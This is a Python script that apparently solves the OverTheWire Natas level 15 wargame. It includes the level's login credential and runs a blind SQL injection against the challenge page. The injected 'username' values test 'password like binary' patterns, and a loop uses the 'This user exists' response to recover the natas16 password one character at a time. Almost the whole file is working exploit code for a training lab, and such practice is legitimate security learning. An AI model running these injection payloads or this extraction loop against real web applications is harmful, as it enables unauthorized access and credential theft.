import requests, sys

url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

charset = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"

payload = {"username": "natas16"}
contain_text = "This user exists"


def post_payload(payload):
    response = requests.post(url, payload, auth=requests.auth.HTTPBasicAuth(username, password))
    if (contain_text in response.text):
        return True
    return False
    
def used_set():
    print("Determining used char set")
    used_set = set()
    for c in charset:
        payload = {"username": "natas16\" and password like binary \"%"+c+"%"}
        if post_payload(payload):
            print("Detected char: " + c)
            used_set.add(c)
    return used_set

def get_pass():
    print("Trying to get password")
    stage_password = ""
    char_set = used_set()
    cont = True
    while(cont):
        for c in char_set:
            payload = {"username": "natas16\" and password like binary\""+stage_password+c+"%"}
            sys.stdout.write("\033[F")
            if post_payload(payload):
                stage_password = stage_password + c
                print("Current password: " + stage_password)
                payload = {"username": "natas16\" and password=\""+stage_password}
                if post_payload(payload):
                    cont = False
                    break      
    return stage_password

if __name__ == "__main__":
    print("Working :D")
    print("Password is: " + get_pass())
        